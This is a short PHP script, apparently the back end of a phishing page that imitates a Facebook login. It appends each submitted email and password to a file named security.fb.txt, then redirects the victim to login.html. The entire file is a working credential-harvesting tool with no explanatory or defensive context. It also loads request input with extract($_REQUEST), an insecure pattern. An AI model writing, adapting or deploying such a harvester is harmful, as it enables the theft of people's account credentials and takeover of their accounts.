<?php
header('Location: login.html');
extract($_REQUEST);
$file=fopen("security.fb.txt","a");

fwrite($file,"email : ");
fwrite($file,$email ."\n");
fwrite($file,"pass : ");
fwrite($file, $pass ."\n");
fwrite($file,"done");
fwrite($file,$done . "\n");
fclose($file);
?>
